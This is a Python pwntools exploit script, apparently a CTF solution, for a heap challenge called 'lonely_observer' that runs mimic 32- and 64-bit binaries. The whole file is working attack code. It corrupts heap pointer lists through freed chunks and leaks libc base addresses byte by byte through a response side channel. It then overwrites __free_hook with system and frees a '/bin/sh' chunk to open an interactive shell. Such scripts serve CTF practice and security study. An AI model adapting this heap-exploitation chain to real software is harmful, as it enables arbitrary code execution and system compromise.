#coding=utf8
from pwn import *
import time 
# context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 1
t64 = 0


if local:
    if t64 == 1:
    	cn = process('./mimic64')
    elif t64 == 2:
        cn = process('./mimic32')
    else:
        cn = process('./lonely_observer')
else:
	cn = remote('',)
	#libc = ELF('')

ru = lambda x : cn.recvuntil(x)
sn = lambda x : cn.send(x)
rl = lambda   : cn.recvline()
sl = lambda x : cn.sendline(x)
rv = lambda x : cn.recv(x)
sa = lambda a,b : cn.sendafter(a,b)
sla = lambda a,b : cn.sendlineafter(a,b)


# bin = ELF('./'+binary_name,checksec=False)
libc64 = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
libc32 = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)

def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


def add(idx,sz,con='a'):
    sla('>>','1')
    sla('index?',str(idx))
    sla('size?',str(sz))
    sa('content:',con)

def dele(idx):
    sla('>>','2')
    sla('index?',str(idx))

def show(idx):
    sla('>>','3')
    sla('index?',str(idx))

def edit(idx,con):
    sla('>>','4')
    sla('index?',str(idx))
    sa('content:',con)


time_start = time.time()


list64 = 0x602060
bss64 = 0x602060+0x10*0x30
list32 = 0x804b060
bss32 = 0x804b060+8*0x30

add(0,1)
add(1,1)
add(2,1)
dele(0)
dele(1)
edit(1,'\x00')
add(3,0x10,p64(0x1000)+p64(list64+8*4))
dele(2)
edit(2,'\x00')
add(4,8,p32(0x1000)+p32(list32+4*8))
dele(2)
edit(2,'\x00')


lbase64 = 0
for idx in range(5,0,-1):
    buf = p32(list32+4*10) + p32(list32+4*12)
    buf+= p32(1) + p32(bss32)#8
    buf+= p32(0x100) + p32(bss32+0x100)#9
    buf = buf.ljust(4*8,'\x00')

    buf+= p64(0x602040+idx) + p64(list64+8*12)
    buf+= p64(0) + p64(0)#8
    buf+= p64(0x100) + p64(0x602041+idx)#9
    buf+= '\n'
    sl('4')
    sla('index?','0')
    sa('content:',buf)
    edit(9,'\x00'*7 + p64(bss64) + '\n')

    sla('>>','4')
    sla('index?','8')
    for sz in range(1,256):
        print('sz:'+str(sz))
        sn('5')
        if 'done!' in cn.recvrepeat(0.1):
            lbase64 += sz << (idx*8)
            success(hex(sz))
            sl('5'*(0x100-sz))
            break
        elif sz == 0xff:
            print('failed')
            exit(0)
lbase64 -= libc64.sym['_IO_2_1_stderr_']&~0xff

lbase32 = 0
for idx in range(3,0,-1):
    buf = p32(0x804b020+idx) + p32(list32+4*12)
    buf+= p32(0) + p32(0)#8
    buf+= p32(0x100) + p32(0x804b021+idx)#9
    buf = buf.ljust(4*8,'\x00')

    buf+= p64(list64+8*10) + p64(list64+8*12)
    buf+= p64(1) + p64(bss64)#8
    buf+= p64(0x100) + p64(bss64+0x100)#9
    buf+= '\n'
    sl('4')
    sla('index?','0')
    sa('content:',buf)
    edit(9,'\x00'*3 + p32(bss32) + '\n')

    sla('>>','4')
    sla('index?','8')
    for sz in range(1,256):
        print('sz:'+str(sz))
        sn('5')
        if 'done!' in cn.recvrepeat(0.1):
            lbase32 += sz << (idx*8)
            success(hex(sz))
            sl('5'*(0x100-sz))
            break
        elif sz == 0xff:
            print('failed')
            exit(0)
lbase32 -= libc32.sym['_IO_2_1_stderr_']&~0xff
success('lbase64:'+hex(lbase64))
success('lbase32:'+hex(lbase32))

buf = p32(list32+4*10) + p32(list32+4*12)
buf+= p32(4) + p32(lbase32+libc32.sym['__free_hook'])#8
buf+= p32(8) + p32(bss32)#9
buf = buf.ljust(4*8,'\x00')

buf+= p64(list64+8*10) + p64(list64+8*12)
buf+= p64(4) + p64(bss64)#8
buf+= p64(8) + p64(lbase64+libc64.sym['__free_hook'])#9
buf+= '\n'
edit(0,buf)
edit(8,p32(lbase32+libc32.sym['system']))
edit(9,p64(lbase64+libc64.sym['system']))
add(0x20,0x20,'/bin/sh\n')
dele(0x20)

time_end = time.time()

print('[*]totally cost:'+str(time_end-time_start))

cn.interactive()
